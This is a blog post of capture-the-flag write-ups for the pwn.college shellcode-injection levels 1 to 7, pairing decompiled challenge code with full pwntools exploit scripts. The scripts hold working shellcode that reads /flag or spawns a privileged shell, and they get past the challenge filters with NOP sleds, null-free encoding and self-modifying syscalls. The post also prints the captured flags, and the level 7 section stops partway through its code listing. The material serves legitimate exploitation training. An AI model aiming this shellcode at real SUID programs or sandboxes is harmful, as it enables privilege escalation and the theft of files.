---
title: "Write-ups: Program Security (Shellcode Injection) series"
pubDate: 2024-12-24
categories: ["Pwn", "Write-ups", "Shellcode"]
description: "Write-ups for pwn.college binary exploitation series."
slug: shellcode-injection
---

## Table of contents

## Level 1

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag!

### Write-up

```plaintext showLineNumbers=false del={8}
pwndbg> checksec
File:     /home/cub3y0nd/Projects/pwn.college/babyshell-level-1
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

```c del={43, 50} collapse={1-39}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-1024h]
  const char **i; // [rsp+30h] [rbp-1020h]
  const char **j; // [rsp+38h] [rbp-1018h]
  _BYTE v10[16]; // [rsp+40h] [rbp-1010h] BYREF
  unsigned __int64 v11; // [rsp+1048h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  puts(
    "In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every");
  puts("execution, your shellcode will need to be *position-independent*.\n");
  shellcode = v10;
  printf("Allocated 0x1000 bytes for shellcode on the stack at %p!\n", v10);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-1.c", 0x69u, "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2565);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

够简单的吧，stack rwx，`((void (*)(void))shellcode)();` 把 `buf` 的地址强制转换为函数指针，执行我们的输入内容。

### Exploit

由于是 SUID 程序，以程序所有者权限运行。所以我们的思路是通过 `sendfile(0x1, open("/flag", 0x0, 0x0), 0x0, 0x1000)` 直接输出 `/flag` 的内容：

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    mov rax, 0x67616c662f
    push rax
    lea rdi, [rsp]
    mov rsi, 0x0
    mov rdx, 0x0
    mov rax, 0x2
    syscall

    mov rdi, 0x1
    mov rsi, rax
    mov rdx, 0x0
    mov rcx, 0x1000
    mov rax, 0x28
    syscall

    mov rdi, 0x0
    mov rax, 0x3c
    syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

还可以用 pwntools 的 shellcraft 来完成：

```python
def construct_payload():
    shellcode = shellcraft.cat("/flag")

    return asm(shellcode)
```

如果要 shell 的话可以这样写，`-p` 参数确保使用真实 `uid`、`gid` 启动 `/bin/sh`：

```python
def construct_payload():
    shellcode = shellcraft.execve("/bin/sh", ["/bin/sh", "-p"], 0)

    return asm(shellcode)
```

### Flag

Flag: `pwn.college{s4taPKpK1SzfB3gWK--PDuB4Xwx.01NxIDL5cTNxgzW}`

## Level 2

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but a portion of your input is randomly skipped.

### Write-up

```c ins={56-59} del={45, 65} collapse={1-41, 49-52}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  unsigned int v5; // eax
  int fd; // [rsp+28h] [rbp-1028h]
  int v9; // [rsp+2Ch] [rbp-1024h]
  const char **i; // [rsp+30h] [rbp-1020h]
  const char **j; // [rsp+38h] [rbp-1018h]
  _BYTE v12[16]; // [rsp+40h] [rbp-1010h] BYREF
  unsigned __int64 v13; // [rsp+1048h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  puts(
    "In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every");
  puts("execution, your shellcode will need to be *position-independent*.\n");
  shellcode = v12;
  printf("Allocated 0x1000 bytes for shellcode on the stack at %p!\n", v12);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-2.c", 0x69u, "main");
  puts("Executing filter...\n");
  puts(
    "This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this");
  puts(
    "is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the");
  puts(
    "actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly");
  puts("execute and then your real shellcode will run. This concept is called a `nop sled`.\n");
  v5 = time(0LL);
  srand(v5);
  v9 = rand() % 1792 + 256;
  shellcode = (char *)shellcode + v9;
  shellcode_size -= v9;
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2735);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这题在上一题的基础之上加了一个简单的限制：随机生成一个 `[0, 2048)` 之内的随机数，将 shellcode 地址设置为 `buf` 起始地址加上这个随机数。所以我们要避免把实际攻击代码放在 `[0, 2048)` 这个地址区间内，通过 `nop sled` 滑过这块区间就可以轻松绕过～

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-2"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    .rept 0x7ff
        nop
    .endr

    mov rax, 0x67616c662f
    push rax
    lea rdi, [rsp]
    mov rsi, 0x0
    mov rdx, 0x0
    mov rax, 0x2
    syscall

    mov rdi, 0x1
    mov rsi, rax
    mov rdx, 0x0
    mov rcx, 0x1000
    mov rax, 0x28
    syscall

    mov rdi, 0x0
    mov rax, 0x3c
    syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

```python
def construct_payload(sled_length):
    shellcode = shellcraft.nop() * sled_length
    shellcode += shellcraft.cat("/flag")

    return asm(shellcode)
```

### Flag

Flag: `pwn.college{ws9aMHkG9tAyi31HLrmkc2LoE35.0FOxIDL5cTNxgzW}`

## Level 3

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.

### Write-up

```c ins={45-52} del={40, 57} collapse={1-36}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-18h]
  int k; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2CE31000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)753078272 )
    __assert_fail("shellcode == (void *)0x2ce31000", "/challenge/babyshell-level-3.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2CE31000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-3.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts("This challenge requires that your shellcode have no NULL bytes!\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( !*((_BYTE *)shellcode + k) )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_251D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这次的限制是 shellcode 的机器指令中不允许出现 `\x00` 字节。这就需要我们好好利用各自指令组合来构造数据了。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-3"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    mov rdi, 0x67616c66
    shl rdi, 0x8
    or rdi, 0x2f
    push rdi
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    or rax, 0x2
    syscall

    xor rdi, rdi
    or rdi, 0x1
    mov rsi, rax
    xor rdx, rdx
    xor r10, r10
    or r10, 0xfffffff
    xor rax, rax
    or rax, 0x28
    syscall

    dec rdi
    xor rax, rax
    or rax, 0x3c
    syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

pwntools 自动生成的代码已经避免了 `\x00`，非常方便～

```python
def construct_payload():
    shellcode = shellcraft.cat("/flag")

    return asm(shellcode)
```

### Flag

Flag: `pwn.college{gZQWA0hDKCz5Xn8KrcsIiwIX2aZ.0VOxIDL5cTNxgzW}`

## Level 4

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.

### Write-up

```c ins={45-52} del={40, 57} collapse={1-36}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-18h]
  int k; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2D632000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)761470976 )
    __assert_fail("shellcode == (void *)0x2d632000", "/challenge/babyshell-level-4.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2D632000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-4.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts("This challenge requires that your shellcode have no H bytes!\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( *((_BYTE *)shellcode + k) == 0x48 )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_251D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

显然，这次不允许我们使用 64-bit 汇编写 shellcode。Why？Cuz 64-bit 汇编指令本质上就是 32-bit 汇编的拓展，大多数指令都以前缀 `0x48` 开始。easy peasy!

`push`、`pop` 指令没有 `0x48` 前缀，可以正常使用。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-4"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    lea ebx, [eip+0x2c]
    xor ecx, esi
    xor edx, edx
    mov eax, 0x5
    int 0x80

    mov ebx, 0x1
    mov ecx, eax
    xor edx, edx
    mov esi, 0x1000
    mov eax, 0xbb
    int 0x80

    mov ebx, 0x0
    mov eax, 0x1
    int 0x80

flag:
    .string "/flag"
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

这里再提供一种写法：

```asm
.global _start
.intel_syntax noprefix

_start:
  push 0x2f
  mov dword ptr [rsp + 1], 0x67616c66
  push rsp
  pop rdi
  xor esi, esi
  xor edx, edx
  mov al, 0x2
  syscall

  mov edi, 0x1
  mov esi, eax
  xor edx, edx
  mov r10, 0x1000
  mov al, 0x28
  syscall

  xor edi, edi
  mov al, 0x3c
  syscall
```

由于这题只是不想让我们用 64-bit 的指令，所以我们不能简单的通过 pwntools 生成 32-bit 指令来解决。这样生成出来的指令无法执行，我估计是内存对齐问题导致？因为这个程序本生是 amd64 的。

### Flag

Flag: `pwn.college{wqf2fgp7CVvoI3yhbzzsqtw5OC3.0FMyIDL5cTNxgzW}`

## Level 5

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?

### Write-up

```c ins={50-58} del={41, 63} collapse={1-37, 45-46}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+20h] [rbp-20h]
  int k; // [rsp+24h] [rbp-1Ch]
  const char **i; // [rsp+28h] [rbp-18h]
  const char **j; // [rsp+30h] [rbp-10h]
  _WORD *v11; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x1A315000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)439439360 )
    __assert_fail("shellcode == (void *)0x1a315000", "/challenge/babyshell-level-5.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x1A315000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-5.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts(
    "This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls");
  puts("are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05");
  puts("(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to");
  puts("insert the `syscall` instructions at runtime.\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    v11 = (char *)shellcode + k;
    if ( *v11 == 0x80CD || *v11 == 0x340F || *v11 == 0x50F )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2675);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

不让出现系统调用指令的机器码，绕过方法非常 ez 啊，请看 exp。

### Exploit

```python ins={49-50, 59-60}
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-5"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = """
    /* push b'/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push 2 /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push 40 /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
    """

    return asm(shellcode)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{AJ-22D5IQdnex2KL8LxB8zOq02R.0VMyIDL5cTNxgzW}`

## Level 6

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!

### Write-up

```c ins={50-58} del={41, 70} collapse={1-37, 45-46, 62-66}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+20h] [rbp-20h]
  int k; // [rsp+24h] [rbp-1Ch]
  const char **i; // [rsp+28h] [rbp-18h]
  const char **j; // [rsp+30h] [rbp-10h]
  _WORD *v11; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x26E45000, 0x2000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)652496896 )
    __assert_fail("shellcode == (void *)0x26e45000", "/challenge/babyshell-level-6.c", 0x62u, "main");
  printf("Mapped 0x2000 bytes for shellcode at %p!\n", (const void *)0x26E45000);
  puts("Reading 0x2000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x2000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-6.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts(
    "This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls");
  puts("are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05");
  puts("(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to");
  puts("insert the `syscall` instructions at runtime.\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    v11 = (char *)shellcode + k;
    if ( *v11 == 0x80CD || *v11 == 0x340F || *v11 == 0x50F )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
  if ( mprotect(shellcode, 0x1000uLL, 5) )
    __assert_fail(
      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
      "/challenge/babyshell-level-6.c",
      0x79u,
      "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
 puts(&byte_26ED);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

还是没难度。首先不允许出现系统调用指令的机器码，其次会在执行 shellcode 前移除前 `0x1000` 字节区块的写权限。由于我们的 shellcode 会去修改自生的指令来绕过不允许出现系统调用指令的机器码，所以肯定不能把 shellcoded 写在前 `0x1000` 字节的区块中，因为程序读了 `0x2000` 字节，所以我们把核心代码写到前 `0x1000` 字节之后即可。至于这前 `0x1000` 字节，我们一个 `nop` 滑铲滑过去就好了。

### Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-6"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(sled_length):
    shellcode = shellcraft.nop() * sled_length
    shellcode += """
    /* push b'/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push 2 /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push 40 /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
    """

    return asm(shellcode)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload(0x1000)

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

### Flag

Flag: `pwn.college{kfVRmOzEaLCMSxdS_zQkxZr6BEv.0lMyIDL5cTNxgzW}`

## Level 7

### Information

- Category: Pwn

### Description

> Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.

### Write-up

```c ins={48-49, 52-53, 57-58} del={39, 60} collapse={1-35, 43-44}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
